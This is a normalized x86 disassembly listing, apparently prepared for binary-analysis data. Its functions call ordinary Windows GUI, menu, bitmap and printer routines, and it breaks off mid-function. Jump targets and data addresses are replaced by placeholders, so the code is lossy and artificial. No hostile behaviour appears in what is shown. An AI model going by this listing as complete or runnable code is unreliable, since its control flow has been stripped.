test eax eax
mov [ esi + 0x14 ] eax
jne r-xdata
push esi
call sub_40e1a6
pop edi
pop esi
retn 0xc
push 0x7f00
push eax
call edi
mov [ esi + 0x14 ] eax
sub_40e275
push ebp
mov ebp esp
sub esp 0x34
call sub_407eab
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0x18 ]
not eax
and [ ebp + 0x8 ] eax
jne r-xdata
push ebx
push esi
push edi
push 0x28
xor edi edi
lea eax [ ebp - 0x34 ]
push edi
push eax
xor esi esi
call sub_4109d0
mov eax [ DefWindowProcA@IAT ]
add esp 0xc
mov [ ebp - 0x30 ] eax
call sub_407eab
test [ ebp + 0x8 ] 0x1
mov eax [ eax + 0x8 ]
push 0x8
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
pop ebx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] ebx
je r-xdata
xor eax eax
inc eax
jmp r-xdata
test [ ebp + 0x8 ] 0x20
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x10 ] r--data
call sub_40e1a6
test eax eax
je r-xdata
leave
retn 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
or [ ebp - 0x34 ] 0x8b
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_40e1a6
test eax eax
je r-xdata
inc esi
test [ ebp + 0x8 ] 0x4
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0x18 ] 0x10
call sub_40e1a6
test eax eax
je r-xdata
or esi 0x20
test [ ebp + 0x8 ] bl
je r-xdata
push 0x7a01
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] edi
call sub_40e234
test eax eax
je r-xdata
or esi 0x2
test [ ebp + 0x8 ] 0x10
je r-xdata
push 0x7a02
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x18 ] 0x6
call sub_40e234
test eax eax
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x40
je r-xdata
push 0x3fc0
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0xff
call sub_40c12d
or esi eax
and [ ebp + 0x8 ] 0xffffc03f
or esi ebx
test [ ebp + 0x8 ] 0x80
je r-xdata
push 0x40
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x10
call sub_40c12d
or esi eax
mov eax 0x100
test [ ebp + 0x8 ] eax
je r-xdata
push 0x80
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x2
call sub_40c12d
or esi eax
mov eax 0x200
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_40c12d
or esi eax
mov ebx 0x400
test [ ebp + 0x8 ] ebx
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x20
call sub_40c12d
or esi eax
mov edi 0x800
test [ ebp + 0x8 ] edi
je r-xdata
push ebx
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x1
call sub_40c12d
or esi eax
mov eax 0x1000
test [ ebp + 0x8 ] eax
je r-xdata
push edi
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x40
call sub_40c12d
or esi eax
mov eax 0x2000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x4
call sub_40c12d
or esi eax
mov eax 0x4000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x80
call sub_40c12d
or esi eax
mov edi 0x8000
test [ ebp + 0x8 ] edi
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edi
call sub_40c12d
or esi eax
mov eax 0x10000
test [ ebp + 0x8 ] eax
je r-xdata
push edi
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_40c12d
or esi eax
mov eax 0x20000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x200
call sub_40c12d
or esi eax
mov eax 0x40000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x100
call sub_40c12d
or esi eax
mov ecx [ ebp - 0x4 ]
or [ ecx + 0x18 ] esi
mov eax [ ecx + 0x18 ]
mov edx 0x3fc0
mov edi eax
and edi edx
cmp edi edx
jne r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edi
call sub_40c12d
or esi eax
mov eax esi
and eax [ ebp + 0x8 ]
pop edi
sub eax [ ebp + 0x8 ]
pop esi
neg eax
sbb eax eax
inc eax
pop ebx
or eax 0x10
mov [ ecx + 0x18 ] eax
or esi 0x10
sub_40e568
push ebp
mov ebp esp
sub esp 0x104
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
push esi
mov esi [ ebp + 0xc ]
push edi
jne r-xdata
test esi esi
je r-xdata
call sub_4054e9
push esi
call [ lstrlenA@IAT ]
push 0xff
mov edi eax
lea eax [ ebp - 0x103 ]
push 0x0
push eax
mov [ ebp - 0x104 ] 0x0
call sub_4109d0
mov eax 0x100
add esp 0xc
cmp edi eax
ja r-xdata
push esi
push ebx
call [ SetWindowTextA@IAT ]
push eax
lea eax [ ebp - 0x104 ]
push eax
push ebx
call [ GetWindowTextA@IAT ]
cmp eax edi
jne r-xdata
push esi
lea eax [ ebp - 0x104 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
leave
retn 0x8
sub_40e5fe
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_4054e9
pop esi
retn 0x4
push eax
call [ DeleteObject@IAT ]
and [ esi ] 0x0
sub_40e620
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn 0x4
push esi
push edi
call [ GlobalFlags@IAT ]
mov esi eax
and esi 0xff
je r-xdata
push edi
call [ GlobalFree@IAT ]
pop esi
push edi
dec esi
call [ GlobalUnlock@IAT ]
test esi esi
jne r-xdata
sub_40e653
push esi
call sub_407976
mov esi eax
test esi esi
je r-xdata
jmp sub_4054cf
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_412eca
pop ecx
mov ecx [ esp + 0x8 ]
lea edx [ ecx + 0x4 ]
cmp eax edx
ja r-xdata
sub eax ecx
sub eax 0x4
push eax
push [ esi + 0xc ]
call sub_412dcc
pop ecx
push [ esi + 0xc ]
call sub_40f613
and [ esi + 0xc ] 0x0
jmp r-xdata
pop ecx
xor eax eax
inc eax
pop esi
retn
sub_40e6a0
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call [ ClientToScreen@IAT ]
mov edi [ GetWindow@IAT ]
push 0x5
push [ ebp + 0x8 ]
jmp r-xdata
call edi
mov esi eax
test esi esi
jne r-xdata
push esi
call [ GetDlgCtrlID@IAT ]
test ax ax
je r-xdata
pop edi
pop esi
leave
retn 0xc
push 0x2
push esi
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call [ GetWindowRect@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
sub_40e712
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x20 ]
push ebx
xor ebx ebx
inc ebx
test eax eax
je r-xdata
call sub_4054e9
mov eax [ ebp + 0x1c ]
add eax 0xffffffc8
cmp eax 0xb
push esi
ja r-xdata
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
mov eax ebx
jmp r-xdata
xor eax eax
jmp [ eax * 4 + jump_table_40e81a ]
pop ebx
pop ebp
retn 0x1c
call [ ebp + 0x14 ]
jmp r-xdata
call [ ebp + 0x14 ]
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
push [ ebp + 0x18 ]
jmp r-xdata
push [ ebp + 0x18 ]
mov eax ebx
jmp r-xdata
mov ebx eax
call [ ebp + 0x14 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
jmp r-xdata
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
jmp r-xdata
push esi
call [ ebp + 0x14 ]
push [ ebp + 0xc ]
push esi
call [ ebp + 0x14 ]
jmp r-xdata
call [ ebp + 0x14 ]
jmp r-xdata
pop esi
xor ebx ebx
cmp [ esi + 0x1c ] ebx
sete bl
and [ esi + 0x1c ] 0x0
jmp r-xdata
sub_40e84a
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0xfffffffe
push edi
mov edi ecx
jne r-xdata
cmp eax 0xfffffffd
push ebx
push esi
jne r-xdata
call sub_407eab
cmp [ eax + 0x3c ] 0x0
jne r-xdata
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebp + 0x10 ]
and [ ebp + 0xc ] 0x0
test ebx ebx
je r-xdata
call sub_407eab
push [ ebp + 0x14 ]
mov eax [ eax + 0x3c ]
push [ ebp + 0x10 ]
mov edx [ eax ]
push [ ebp + 0x8 ]
mov ecx eax
push edi
call [ edx + 0x4 ]
jmp r-xdata
call sub_4054e9
mov ebx 0x111
mov ebx eax
shr ebx 0x10
movzx eax ax
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebx + 0x30 ]
mov [ ebp + 0x10 ] eax
mov eax [ edi ]
call [ eax + 0x2c ]
mov edi eax
jmp r-xdata
pop edi
pop ebp
retn 0x10
mov esi eax
cmp [ esi ] 0x0
jne r-xdata
mov eax [ edi ]
call [ eax + 0x28 ]
jmp r-xdata
test edi edi
jne r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push ebx
push [ esi + 0x4 ]
call sub_40a426
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
push [ ebp + 0x14 ]
push [ eax + 0x10 ]
push [ ebp + 0x10 ]
push [ eax + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call sub_40e712
jmp r-xdata
call [ esi ]
mov esi [ edi + 0x4 ]
jmp r-xdata
pop esi
pop ebx
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov edi [ edi ]
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] eax
jne r-xdata
add esi 0xc
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push eax
push [ ebp + 0x10 ]
call sub_4084dc
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ esi + 0x8 ]
mov [ ebx + 0x4 ] eax
mov [ ebp + 0xc ] 0x1
jmp r-xdata
sub_40e999
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x20 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x18 ] ecx
retn
sub_40e9db
push esi
mov esi ecx
call sub_407eab
mov [ esi + 0x1c ] eax
xor eax eax
inc eax
xor ecx ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] ecx
mov [ esi + 0x18 ] ecx
mov eax esi
pop esi
retn
sub_40ea40
push ebx
push esi
mov esi ecx
mov ecx [ esi + 0xc ]
xor ebx ebx
cmp ecx ebx
je r-xdata
cmp [ esi + 0x14 ] ebx
je r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
call sub_4054e9
cmp [ esp + 0xc ] ebx
jne r-xdata
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x20 ]
jb r-xdata
push [ esp + 0xc ]
mov ecx [ esi + 0x14 ]
call sub_40ef6b
push edi
mov edi [ esi + 0x14 ]
call [ GetFocus@IAT ]
cmp eax [ edi + 0x20 ]
jne r-xdata
mov edx [ esp + 0xc ]
neg edx
sbb edx edx
and edx 0xfffffffd
add edx 0x3
or edx 0x400
push edx
push eax
push [ ecx + 0x4 ]
call [ EnableMenuItem@IAT ]
jmp r-xdata
pop edi
push [ edi + 0x20 ]
call [ GetParent@IAT ]
push eax
call sub_40bc44
push ebx
push ebx
push 0x28
push [ eax + 0x20 ]
call [ SendMessageA@IAT ]
mov [ esi + 0x18 ] 0x1
sub_40eacf
push esi
mov esi ecx
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
call sub_4054e9
push edi
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x87
push [ eax + 0x20 ]
call edi
test ax 0x2000
je r-xdata
pop esi
retn 0x4
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x20 ]
jb r-xdata
pop edi
mov eax [ esi + 0x14 ]
push 0x0
push [ esp + 0x10 ]
push 0xf1
push [ eax + 0x20 ]
call edi
mov edx [ esp + 0x8 ]
neg edx
sbb edx edx
and edx 0x8
or edx 0x400
push edx
push eax
push [ ecx + 0x4 ]
call [ CheckMenuItem@IAT ]
jmp r-xdata
sub_40eb44
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
push esi
push edi
mov esi ecx
jne r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
call sub_4054e9
mov esi [ esi + 0x14 ]
test esi esi
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
push ebx
push [ esi + 0x20 ]
call sub_40e568
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ esi + 0x8 ]
mov edi 0x400
push edi
push ecx
push [ eax + 0x4 ]
call [ GetMenuState@IAT ]
mov ecx [ esi + 0x8 ]
and eax 0xfffff6fb
cmp ecx [ esi + 0x20 ]
jae r-xdata
push ebx
push [ esi + 0x4 ]
or eax edi
push eax
push ecx
mov ecx [ esi + 0xc ]
call sub_40e9bf
jmp r-xdata
sub_40ebab
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x74 ] eax
push ebx
push esi
push edi
call [ GetMenuCheckMarkDimensions@IAT ]
movsx ebx ax
shr eax 0x10
cmp ebx 0x4
movsx ecx ax
mov [ ebp - 0x18 ] ecx
jle r-xdata
jmp sub_4054e9
cmp ecx 0x5
jg r-xdata
cmp ebx 0x20
jle r-xdata
lea eax [ ebx - 0x4 ]
cdq
sub eax edx
lea esi [ ebx + 0xf ]
sar esi 0x4
mov edi eax
sar edi 0x1
mov eax esi
shl eax 0x4
add edi eax
sub edi ebx
cmp edi 0xc
jle r-xdata
push 0x20
pop ebx
push 0x20
pop eax
cmp ecx eax
jle r-xdata
push 0xc
pop edi
push 0x80
lea eax [ ebp - 0xc ]
push 0xff
push eax
call sub_4109d0
mov eax [ ebp - 0x18 ]
add eax 0xfffffffa
sar eax 0x1
add esp 0xc
imul eax esi
lea ecx [ esi + esi ]
lea eax [ ebp + eax * 2 - 0xc ]
mov edx r--data
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] 0x5
mov [ ebp - 0x18 ] eax
movzx si [ edx ]
mov ecx edi
shl si cl
inc edx
not si
movzx ecx si
mov [ eax ] ch
mov [ eax + 0x1 ] cl
add eax [ ebp - 0x14 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x1
push 0x1
push [ ebp - 0x18 ]
push ebx
call [ CreateBitmap@IAT ]
test eax eax
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
jne r-xdata
mov ecx [ ebp + 0x74 ]
xor ecx ebp
call sub_40f589
add ebp 0x78
leave
retn
push 0x7fe3
push eax
call [ LoadBitmapA@IAT ]
mov [ rw-data ] eax
sub_40eca9
push esi
mov esi ecx
mov eax [ esi ]
push edi
xor ecx ecx
xor edi edi
cmp [ esp + 0xc ] edi
setne cl
push ecx
mov ecx esi
call [ eax + 0x4 ]
cmp [ esi + 0xc ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x10 ] edi
jne r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x20 ]
jb r-xdata
cmp [ rw-data ] edi
jne r-xdata
call sub_4054e9
push [ rw-data ]
mov eax [ esi + 0xc ]
push edi
push 0x400
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ SetMenuItemBitmaps@IAT ]
call sub_40ebab
cmp [ rw-data ] edi
je r-xdata
sub_40ed0c
push 0x4
mov eax sub_421158
call sub_41021d
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push 0x40
mov [ esi ] r--data
push [ edi + 0x4 ]
lea ecx [ esi + 0x4 ]
call sub_40f505
and [ ebp - 0x4 ] 0x0
push 0xa
lea ecx [ esi + 0x1c ]
call sub_4089aa
lea ebx [ esi + 0x38 ]
push 0x4
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call sub_4089aa
xor eax eax
cmp [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] eax
je r-xdata
call sub_4054e9
push eax
push 0x7
mov ecx ebx
call sub_4087d0
mov eax [ ebp + 0xc ]
mov [ esi + 0x14 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x5c ] eax
mov [ esi + 0x54 ] edi
mov eax esi
call sub_4102bc
retn 0x14
sub_40ed95
push 0x8
mov eax sub_42111c
call sub_410250
mov esi ecx
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push edi
lea ecx [ esi + 0x1c ]
call sub_4088a6
test eax eax
jne r-xdata
xor eax eax
call sub_4102bc
retn 0x4
lea ecx [ esi + 0x38 ]
push edi
call sub_4088a6
test eax eax
je r-xdata
push sub_40e653
call sub_4053cd
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x4 ]
mov [ ebp + 0x8 ] eax
call sub_40f549
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x58 ]
add ecx eax
mov [ ecx ] edi
cmp [ esi + 0x5c ] 0x2
jne r-xdata
push ebx
call [ esi + 0x14 ]
push edi
lea ecx [ esi + 0x38 ]
call sub_408a31
push [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] ebx
call sub_4053cd
mov eax [ esi + 0x58 ]
add eax ebx
mov [ eax ] edi
cmp [ esi + 0x5c ] 0x2
jne r-xdata
call sub_4054cf
mov [ ecx + 0x4 ] edi
jmp r-xdata
mov eax ebx
jmp r-xdata
mov [ eax + 0x4 ] edi
sub_40ee48
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
leave
retn
mov eax [ esi + 0x44 ]
neg eax
sbb eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
lea ecx [ esi + 0x38 ]
call sub_40882a
lea ecx [ esi + 0x4 ]
call sub_40f52f
push edi
lea edi [ esi + 0x38 ]
push [ ebp - 0x4 ]
call [ esi + 0x18 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
and [ eax + 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
call sub_408929
mov eax [ esi + 0x58 ]
add eax [ ebp - 0x4 ]
and [ eax ] 0x0
cmp [ esi + 0x5c ] 0x2
jne r-xdata
pop edi
sub_40eeab
push 0x4
mov eax sub_421158
call sub_41021d
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
call sub_40ee48
lea ecx [ esi + 0x38 ]
mov [ ebp - 0x4 ] 0x1
call sub_4089d8
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x4 ] 0x0
call sub_4089d8
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x4 ]
call j_sub_40f52f
call sub_4102bc
retn
sub_40ef8c
push ebp
mov ebp esp
cmp [ ecx + 0x50 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x50 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x20 ]
call [ SetWindowPos@IAT ]
pop ebp
retn 0x18
mov eax [ eax + 0x20 ]
sub_40efc8
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn 0x4
cmp [ esi + 0x50 ] 0x0
jne r-xdata
push [ esi + 0x20 ]
call [ GetParent@IAT ]
mov ecx [ esp + 0x8 ]
push eax
add ecx 0x1c
call sub_4088a6
test eax eax
je r-xdata
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ eax + 0x4c ]
mov edx [ eax ]
push 0x0
push esi
mov ecx eax
call [ edx + 0x9c ]
sub_40f009
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
call sub_4054e9
cmp [ esp + 0xc ] 0x0
je r-xdata
imul eax [ esp + 0xc ]
add eax 0x4
push eax
call sub_4053df
pop ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov [ ecx ] eax
retn 0xc
sub_40f07d
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
mov esi ecx
jge r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
jl r-xdata
call sub_4054e9
cmp edi ebx
jne r-xdata
mov [ esi + 0x10 ] eax
mov ecx [ esi + 0x4 ]
cmp ecx ebx
jne r-xdata
push [ esi + 0x4 ]
call j_sub_40f613
pop ecx
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] ebx
jmp r-xdata
mov ebx [ esi + 0xc ]
cmp edi ebx
jg r-xdata
cmp edi 0xffffffff
ja r-xdata
mov [ esi + 0x4 ] ebx
mov eax [ esi + 0x10 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
cmp edi eax
jle r-xdata
push edi
call sub_4053df
push edi
push ebx
push eax
mov [ esi + 0x4 ] eax
call sub_4109d0
add esp 0x10
mov [ esi + 0xc ] edi
jmp r-xdata
add eax ebx
cmp edi eax
mov [ ebp + 0x8 ] eax
jl r-xdata
mov eax [ esi + 0x8 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
cmp eax 0x4
jl r-xdata
mov [ esi + 0x8 ] edi
jmp r-xdata
mov edx edi
sub edx eax
push edx
add eax ecx
push 0x0
push eax
call sub_4109d0
add esp 0xc
cmp [ ebp + 0x8 ] ebx
jl r-xdata
mov [ ebp + 0x8 ] edi
push 0x4
pop eax
mov ecx 0x400
cmp eax ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0x8 ]
call sub_4053df
push [ esi + 0x8 ]
mov ebx eax
push [ esi + 0x4 ]
push [ ebp + 0x8 ]
push ebx
call sub_406d68
mov eax [ esi + 0x8 ]
mov ecx edi
sub ecx eax
push ecx
add eax ebx
push 0x0
push eax
call sub_4109d0
push [ esi + 0x4 ]
call j_sub_40f613
mov eax [ ebp + 0x8 ]
add esp 0x24
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] eax
cmp eax 0x4
jge r-xdata
mov eax ecx
jmp r-xdata
sub_40f18d
push ebx
push ebp
mov ebp [ esp + 0xc ]
mov eax [ ebp + 0x18 ]
push esi
not eax
test al 0x1
mov esi ecx
push edi
mov ecx ebp
je r-xdata
call sub_409172
push 0xffffffff
push eax
mov ecx esi
call sub_40f07d
mov edi [ esi + 0x8 ]
test edi edi
mov esi [ esi + 0x4 ]
jbe r-xdata
push [ esi + 0x8 ]
call sub_409146
mov edi [ esi + 0x8 ]
test edi edi
mov esi [ esi + 0x4 ]
jbe r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
mov ebx 0x7fffffff
cmp edi ebx
jae r-xdata
mov ebx 0x7fffffff
cmp edi ebx
jae r-xdata
push ebx
push esi
mov ecx ebp
call sub_4091a1
add esi ebx
sub edi ebx
jne r-xdata
mov ebx edi
push ebx
push esi
mov ecx ebp
call sub_409081
add esi ebx
sub edi ebx
jne r-xdata
mov ebx edi
jmp r-xdata
sub_40f282
push 0x0
mov eax sub_42117d
call sub_41021d
call sub_407ede
mov esi eax
cmp [ esi + 0x18 ] 0x0
jne r-xdata
mov eax [ esi + 0x18 ]
call sub_4102bc
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push sub_40e653
call sub_4053cd
push 0x60
mov ebx eax
call sub_4053df
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push sub_40f245
push sub_40f26d
push r--data
call sub_40ed0c
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x18 ] eax
call sub_4053cd
sub_40f31e
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_40f282
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x1c ]
call sub_4088e6
sub_40f39c
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x74 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
pop edi
pop esi
leave
retn 0x4
push ebx
mov ebx [ GlobalLock@IAT ]
push eax
call ebx
movzx ecx [ eax + 0x2 ]
push [ ebp + 0x8 ]
add ecx eax
push ecx
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
pop ebx
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ esi + 0x70 ]
cmp eax edi
je r-xdata
push edi
push edi
push edi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
push eax
push 0x42
call [ GlobalAlloc@IAT ]
push eax
mov [ esi + 0x70 ] eax
call ebx
push 0x2
push edi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
cmp eax 0x1
je r-xdata
push eax
call sub_40e620
push [ ebp - 0x4 ]
call ClosePrinter
push [ esi + 0x70 ]
call sub_40e620
mov [ esi + 0x70 ] edi
sub_40f4b5
call sub_407eab
add eax 0x2c
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
retn
jmp r-xdata
call sub_407eab
cmp [ eax + 0x30 ] 0x0
jne r-xdata
retn
push esi
push 0x1
call sub_40f45a
call sub_407eab
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
call sub_407eab
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
pop esi
push 0x0
call sub_40f380
call sub_40ef50
test eax eax
je r-xdata
mov ecx [ esi + 0x20 ]
mov eax [ ecx ]
pop esi
jmp [ eax + 0x60 ]
sub_40f4ce
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x18 ]
push eax
call [ GetOEMCP@IAT ]
push eax
call [ GetCPInfo@IAT ]
mov ecx [ ebp - 0x4 ]
xor eax eax
inc eax
cmp eax [ ebp - 0x18 ]
sbb eax eax
xor ecx ebp
neg eax
call sub_40f589
leave
retn
sub_40f505
mov eax ecx
mov ecx [ esp + 0x4 ]
cmp ecx 0x4
jae r-xdata
mov edx [ esp + 0x8 ]
cmp edx 0x1
